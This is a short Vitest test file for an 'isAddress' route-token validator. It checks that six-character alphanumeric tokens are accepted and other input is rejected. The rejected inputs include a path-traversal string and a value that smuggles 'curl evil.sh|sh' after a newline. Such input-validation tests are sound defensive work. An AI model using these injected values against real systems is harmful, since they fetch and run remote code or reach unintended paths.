import { describe, it, expect } from "vitest";
import { isAddress } from "./address";

describe("isAddress", () => {
  it("accepts a bare six-character alphanumeric token", () => {
    expect(isAddress("abc123")).toBe(true);
    expect(isAddress("0HKKIK")).toBe(true);
  });

  // Addresses arrive from the route, so they are whatever the visitor typed.
  it("rejects anything else", () => {
    expect(isAddress("abc12")).toBe(false);
    expect(isAddress("abc1234")).toBe(false);
    expect(isAddress("abc/12")).toBe(false);
    expect(isAddress("a/../api")).toBe(false);
    expect(isAddress("abc\ncurl evil.sh|sh")).toBe(false);
    expect(isAddress("")).toBe(false);
    expect(isAddress(undefined)).toBe(false);
  });
});
